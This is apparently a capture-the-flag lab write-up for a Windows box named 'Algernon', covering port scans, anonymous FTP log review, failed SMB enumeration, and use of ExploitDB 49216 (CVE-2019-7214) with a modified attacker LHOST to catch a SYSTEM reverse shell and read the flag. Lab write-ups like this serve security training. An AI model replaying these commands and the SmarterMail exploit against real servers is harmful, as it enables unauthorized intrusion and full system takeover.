# Algernon

## Initial access

Ran `autorecon` to enumerate the target:

```
sudo autorecon 192.168.239.65
```

Open ports discovered:

- **21** — FTP (Microsoft ftpd)
  - Anonymous login allowed
- **80** — HTTP (Microsoft IIS httpd 10.0)
  - Additional pages found:
    - `http://192.168.239.65/aspnet_client/`
- **135** — MSRPC (Microsoft Windows RPC)
- **139** — NetBIOS (Microsoft Windows netbios-ssn)
- **445** — SMB
- **5040** — unknown
- **9998** — HTTP (Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP))
  - Additional pages found:
    - `http://192.168.239.65:9998/interface/root`
    - `http://192.168.239.65:9998/download`
    - `http://192.168.239.65:9998/interface/errors/404.html`
- **17001** — MS .NET Remoting services
- **49664–49669** — MSRPC

Ran `nmap` with service version detection and TCP connect scan to confirm open ports:

```
nmap -sVC -p- -v -T4 -sT --open 192.168.239.65
...
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  09:31PM       <DIR>          ImapRetrieval
| 11-23-26  06:43AM       <DIR>          Logs
| 04-29-20  09:31PM       <DIR>          PopRetrieval
|_04-29-20  09:32PM       <DIR>          Spool
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Did not follow redirect to /interface/root
|_http-favicon: Unknown favicon MD5: 9D7294CAAB5C2DF4CD916F53653714D5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Mon, 23 Nov 2026 15:20:34 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
|_http-server-header: Microsoft-IIS/10.0
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Key findings from the nmap scan:

- Port **17001** — MS .NET Remoting services
- Ports **49664–49669** — MSRPC

Enumerated the FTP server with anonymous login:

```
ftp anonymous@192.168.239.65

ftp> dir -a
229 Entering Extended Passive Mode (|||49878|)
125 Data connection already open; Transfer starting.
04-29-20  09:31PM       <DIR>          ImapRetrieval
11-23-26  06:43AM       <DIR>          Logs
04-29-20  09:31PM       <DIR>          PopRetrieval
04-29-20  09:32PM       <DIR>          Spool

ftp> cd Logs
ftp> prompt
ftp> mget *
```

- The other directories (`ImapRetrieval`, `PopRetrieval`, `Spool`) were empty.

Downloaded and reviewed the log files in the `Logs` directory:

- `delivery.log` — references ClamAV
- `profiler.log` — empty
- `smtp.log` — shows start and stop of SMTP service
- `xmpp.log` — shows start and stop of XMPP service
- `administrative.log` — references login to Webmail using username `admin`
- `imapLog.log` — contains a `SocketException` indicating the IMAP service failed to bind:

```
07:27:23.843 System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
	at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
	at System.Net.Sockets.Socket.Bind(EndPoint localEP)
	at MailService.TcpServerLib.Common.PooledTcpServer.StartListening(IPEndPoint ipEndPoint)
```

- `popLog.log` — similar `SocketException` for the POP service:

```
09:23:16.268 System.Net.Sockets.SocketException (0x80004005): The requested address is not valid in its context
	at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
	at System.Net.Sockets.Socket.Bind(EndPoint localEP)
	at MailService.TcpServerLib.Common.PooledTcpServer.StartListening(IPEndPoint ipEndPoint)
```

Attempted SMB enumeration — access was denied:

```
smbclient -L //192.168.239.65/ -N
session setup failed: NT_STATUS_ACCESS_DENIED

nxc smb 192.168.239.65 -u '' -p '' --shares
SMB         192.168.239.65  445    ALGERNON         [*] Windows 10 / Server 2019 Build 18362 x64 (name:ALGERNON) (domain:algernon) (signing:True) (SMBv1:None)
SMB         192.168.239.65  445    ALGERNON         [-] algernon\: STATUS_ACCESS_DENIED 
SMB         192.168.239.65  445    ALGERNON         [-] Error enumerating shares: Error occurs while reading from remote(104)

enum4linux-ng -A 192.168.239.65
```

- No interesting findings.

Browsed to `http://192.168.239.65` — default Microsoft IIS page.

Browsed to `http://192.168.239.65/aspnet_client/` — empty webpage.

Ran feroxbuster directory enumeration on the aspnet_client path:

```
feroxbuster -u http://192.168.239.65/aspnet_client/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old,conf,json,xml,asp,aspx,jsp -t 50 --depth 4 -r -C 403,404
...
200      GET        0l        0w        0c http://192.168.239.65/aspnet_client/system_web/
```

Browsed to `http://192.168.239.65/aspnet_client/system_web/` — empty webpage.

Browsed to `http://192.168.239.65:9998` — redirected to `http://192.168.239.65:9998/interface/root#/login`. The service is **SmarterMail**, a webmail platform.

Searched ExploitDB for SmarterMail vulnerabilities:

```
searchsploit smartermail  
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
SmarterMail 16 - Arbitrary File Upload                                             | multiple/webapps/48580.py
SmarterMail 7.1.3876 - Directory Traversal                                         | windows/remote/15048.txt
SmarterMail 7.3/7.4 - Multiple Vulnerabilities                                     | asp/webapps/16955.txt
SmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities                    | asp/webapps/16975.txt
SmarterMail < 7.2.3925 - LDAP Injection                                            | asp/webapps/15189.txt
SmarterMail < 7.2.3925 - Persistent Cross-Site Scripting                           | asp/webapps/15185.txt
SmarterMail Build 6985 - Remote Code Execution                                     | windows/remote/49216.py
SmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting         | asp/webapps/31017.php
smartermail free 9.2 - Persistent Cross-Site Scripting                             | windows/webapps/20362.py
SmarterTools SmarterMail 4.3 - 'Subject' HTML Injection                            | php/webapps/31240.txt
SmarterTools SmarterMail 5.0 - HTTP Request Handling Denial of Service             | windows/dos/31607.py
----------------------------------------------------------------------------------- ---------------------------------
```

The exploit **SmarterMail Build 6985 — Remote Code Execution** (ExploitDB 49216) was identified as applicable. This exploit targets CVE-2019-7214, an unauthenticated .NET Remoting deserialization vulnerability on port 17001 that affects SmarterMail builds prior to 6985.

Downloaded the exploit and modified the `HOST` and `LHOST` values:

```
searchsploit -m 49216

diff 49216.py 49216_modified.py 
21c21
< HOST='192.168.1.1'
---
> HOST='192.168.239.65'
23c23
< LHOST='192.168.1.2'
---
> LHOST='192.168.45.208'
```

Ran the modified exploit and caught a reverse shell using `penelope` as `nt authority\system`:

```
python3 49216_modified.py

# penelope
PS C:\Windows\system32> whoami
nt authority\system
```

Retrieved the `proof.txt` flag:

```
PS C:\Windows\system32> powershell -c "Get-ChildItem C:\ -Recurse -Filter proof.txt -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName"
C:\Users\Administrator\Desktop\proof.txt

PS C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
b658885c5c1cca88fd202919dd01af93
```

No privilege escalation was required — the SmarterMail RCE exploit (CVE-2019-7214) yielded a direct `nt authority\system` shell.
